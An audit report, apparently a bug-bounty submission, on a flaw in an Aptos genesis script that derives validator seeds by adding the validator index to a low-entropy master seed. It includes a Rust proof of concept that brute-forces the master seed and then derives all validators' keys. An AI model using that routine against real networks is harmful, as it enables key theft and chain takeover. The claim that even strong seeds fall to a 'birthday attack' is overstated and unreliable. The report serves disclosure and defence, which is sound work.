# Audit Report

## Title
Sequential Seed Derivation in Genesis Ceremony Allows Complete Validator Key Compromise

## Summary
The genesis ceremony deployment script uses sequential integer addition to derive validator seeds from a master seed (RANDOM_SEED + validator_index), providing no cryptographic separation between validators. An attacker who compromises one validator's private keys can brute-force the master seed and derive all other validators' keys, leading to complete network compromise.

## Finding Description

The genesis ceremony script generates validator keys using a critically flawed derivation scheme. [1](#0-0) 

The seed for each validator is computed as:
```
seed = RANDOM_SEED + validator_index
```

This means validator 0 uses seed `RANDOM_SEED`, validator 1 uses `RANDOM_SEED + 1`, validator 2 uses `RANDOM_SEED + 2`, and so on. The `RANDOM_SEED` variable defaults to bash's `$RANDOM` which provides only 15 bits of entropy. [2](#0-1) 

**Attack Path:**

1. Attacker compromises ONE validator's private keys (through any means - software vulnerability, physical access, social engineering, etc.)
2. Attacker knows or determines the validator's index `i` in the genesis set
3. Attacker brute-forces potential RANDOM_SEED values:
   - For each candidate seed `S`, compute `validator_seed = S + i`
   - Generate keys using that seed via `KeyGen::from_seed()` [3](#0-2) 
   - Call `generate_key_objects()` to derive the validator's keys [4](#0-3) 
   - Compare against known compromised keys
4. Once RANDOM_SEED is found, derive ALL other validators' keys using `RANDOM_SEED + j` for each validator index `j`

**Why This Works:**

The `KeyGen` wrapper uses `StdRng::from_seed()` for deterministic key generation. [3](#0-2)  Each validator's keys are deterministically derived from their seed through `generate_key_objects()`. [5](#0-4) 

The critical flaw is that seeds are separated by only sequential integers (1, 2, 3...) with no cryptographic domain separation, key stretching, or independent randomness per validator.

## Impact Explanation

**Critical Severity** - This vulnerability enables complete network takeover:

- **Consensus Compromise**: With >1/3 of validator keys (Byzantine threshold), attacker can halt the network or cause safety violations
- **Complete Network Control**: With >2/3 of validator keys, attacker achieves supermajority and can:
  - Arbitrarily modify blockchain state
  - Steal all user funds
  - Censor transactions permanently
  - Force invalid state transitions
- **Irreversible Damage**: Network requires complete re-genesis with new validators, effectively destroying the chain

This meets the "Critical Severity" category: "Loss of Funds (theft or minting)" and "Consensus/Safety violations" with potential impact up to $1,000,000 per the Aptos bug bounty program.

## Likelihood Explanation

**HIGH Likelihood** if genesis ceremony uses this script with `RANDOM_SEED` set:

- **Weak Master Seed**: If `RANDOM_SEED` uses bash's `$RANDOM` (15 bits), brute-forcing requires only 2^15 = 32,768 attempts - trivially fast
- **Even Strong Seeds Vulnerable**: Even with a cryptographically strong RANDOM_SEED, compromising one validator reveals the entire key derivation scheme, requiring only moderate computational effort to brute-force (birthday attack complexity)
- **Single Point of Failure**: One validator compromise cascades to ALL validators
- **Deployment Reality**: This script is in the main repository under `terraform/helm/genesis/` suggesting it's used for actual deployments

**MEDIUM Likelihood** if validators generate keys independently:

If the CLI command `aptos genesis generate-keys` without `--random-seed` is used (which defaults to OS RNG), each validator gets independent keys. [6](#0-5) 

However, the existence of this flawed script in the production codebase indicates it may be used, especially for test networks or automated deployments.

## Recommendation

**Immediate Fix:**

1. **Remove sequential seed derivation entirely** from genesis.sh
2. **Require each validator to generate keys independently** using:
   ```bash
   aptos genesis generate-keys --output-dir $user_dir
   ```
   This uses `KeyGen::from_os_rng()` which provides cryptographically secure independent randomness per validator.

3. **If deterministic generation is required** (for reproducible testing), use proper key derivation:
   ```bash
   # Use HKDF or similar KDF with proper domain separation
   seed=$(echo -n "${MASTER_SEED}|validator|${i}" | sha256sum | cut -d' ' -f1)
   ```

**Additional Hardening:**

- Add warnings in code comments that `--random-seed` is for TESTING ONLY
- Implement detection for sequential seeds in production genesis ceremonies
- Require validator key generation to be performed independently by each validator operator, NOT centrally
- Add entropy verification to ensure sufficient randomness

**Fixed Code for genesis.sh:**
```bash
# ALWAYS use OS RNG for production
aptos genesis generate-keys --output-dir $user_dir

# Remove all code paths that use --random-seed for multiple validators
```

## Proof of Concept

```rust
// PoC demonstrating key derivation from sequential seeds
use aptos_keygen::KeyGen;
use aptos_genesis::keys::generate_key_objects;

fn main() {
    // Simulate compromised validator 2's keys
    let master_seed: u64 = 12345; // Example master seed
    let compromised_validator_index = 2;
    
    // Generate keys for compromised validator
    let compromised_seed = master_seed + compromised_validator_index;
    let mut keygen_compromised = KeyGen::from_seed(u64_to_seed(compromised_seed));
    let (_, _, priv_identity, _) = generate_key_objects(&mut keygen_compromised).unwrap();
    
    println!("Compromised validator {} keys:", compromised_validator_index);
    println!("Account: {:?}", priv_identity.account_address);
    
    // Attacker brute-forces master seed
    println!("\nBrute-forcing master seed...");
    for candidate_master in 0..100000u64 {
        let candidate_seed = candidate_master + compromised_validator_index;
        let mut test_keygen = KeyGen::from_seed(u64_to_seed(candidate_seed));
        let (_, _, test_identity, _) = generate_key_objects(&mut test_keygen).unwrap();
        
        if test_identity.account_address == priv_identity.account_address {
            println!("FOUND master seed: {}", candidate_master);
            
            // Derive all other validators' keys
            println!("\nDeriving all validator keys:");
            for i in 0..5 {
                let validator_seed = candidate_master + i;
                let mut val_keygen = KeyGen::from_seed(u64_to_seed(validator_seed));
                let (_, _, val_identity, _) = generate_key_objects(&mut val_keygen).unwrap();
                println!("Validator {}: {:?}", i, val_identity.account_address);
            }
            break;
        }
    }
}

fn u64_to_seed(n: u64) -> [u8; 32] {
    let mut seed = [0u8; 32];
    seed[0..8].copy_from_slice(&n.to_le_bytes());
    seed
}
```

This PoC demonstrates that once one validator's keys are known, the master seed can be brute-forced (especially if it has low entropy), allowing derivation of all other validators' keys.

## Notes

The core issue is not in the `generate_key_objects()` function itself, which correctly generates keys from a provided `KeyGen`. The vulnerability exists in HOW the genesis deployment script creates seeds for multiple validators - using simple sequential addition without cryptographic separation. This violates the **Cryptographic Correctness** invariant that requires keys to be independently and securely generated.

The vulnerability is particularly severe because it transforms a single-validator compromise into a complete network takeover, bypassing the Byzantine fault tolerance guarantees that require >1/3 malicious validators.

### Citations

**File:** terraform/helm/genesis/files/genesis.sh (L26-26)
```shellscript
RANDOM_SEED=${RANDOM_SEED:-$RANDOM}
```

**File:** terraform/helm/genesis/files/genesis.sh (L112-118)
```shellscript
  if [[ -z "${RANDOM_SEED}" ]]; then
    aptos genesis generate-keys --output-dir $user_dir
  else
    seed=$(printf "%064x" "$((${RANDOM_SEED_IN_DECIMAL} + i))")
    echo "seed=$seed for ${i}th validator"
    aptos genesis generate-keys --random-seed $seed --output-dir $user_dir
  fi
```

**File:** crates/aptos-keygen/src/lib.rs (L20-23)
```rust
    /// Constructs a key generator with a specific seed.
    pub fn from_seed(seed: [u8; 32]) -> Self {
        Self(StdRng::from_seed(seed))
    }
```

**File:** crates/aptos-genesis/src/keys.rs (L36-80)
```rust
pub fn generate_key_objects(
    keygen: &mut KeyGen,
) -> anyhow::Result<(IdentityBlob, IdentityBlob, PrivateIdentity, PublicIdentity)> {
    let account_key = ConfigKey::new(keygen.generate_ed25519_private_key());
    let consensus_key = ConfigKey::new(keygen.generate_bls12381_private_key());
    let validator_network_key = ConfigKey::new(keygen.generate_x25519_private_key()?);
    let full_node_network_key = ConfigKey::new(keygen.generate_x25519_private_key()?);

    let account_address = AuthenticationKey::ed25519(&account_key.public_key()).account_address();

    // Build these for use later as node identity
    let validator_blob = IdentityBlob {
        account_address: Some(account_address),
        account_private_key: Some(account_key.private_key()),
        consensus_private_key: Some(consensus_key.private_key()),
        network_private_key: validator_network_key.private_key(),
    };
    let vfn_blob = IdentityBlob {
        account_address: Some(account_address),
        account_private_key: None,
        consensus_private_key: None,
        network_private_key: full_node_network_key.private_key(),
    };

    let private_identity = PrivateIdentity {
        account_address,
        account_private_key: account_key.private_key(),
        consensus_private_key: consensus_key.private_key(),
        full_node_network_private_key: full_node_network_key.private_key(),
        validator_network_private_key: validator_network_key.private_key(),
    };

    let public_identity = PublicIdentity {
        account_address,
        account_public_key: account_key.public_key(),
        consensus_public_key: Some(private_identity.consensus_private_key.public_key()),
        consensus_proof_of_possession: Some(bls12381::ProofOfPossession::create(
            &private_identity.consensus_private_key,
        )),
        full_node_network_public_key: Some(full_node_network_key.public_key()),
        validator_network_public_key: Some(validator_network_key.public_key()),
    };

    Ok((validator_blob, vfn_blob, private_identity, public_identity))
}
```

**File:** crates/aptos/src/common/types.rs (L593-604)
```rust
    pub fn key_generator(&self) -> CliTypedResult<KeyGen> {
        if let Some(ref seed) = self.random_seed {
            // Strip 0x
            let seed = seed.strip_prefix("0x").unwrap_or(seed);
            let mut seed_slice = [0u8; 32];

            hex::decode_to_slice(seed, &mut seed_slice)?;
            Ok(KeyGen::from_seed(seed_slice))
        } else {
            Ok(KeyGen::from_os_rng())
        }
    }
```
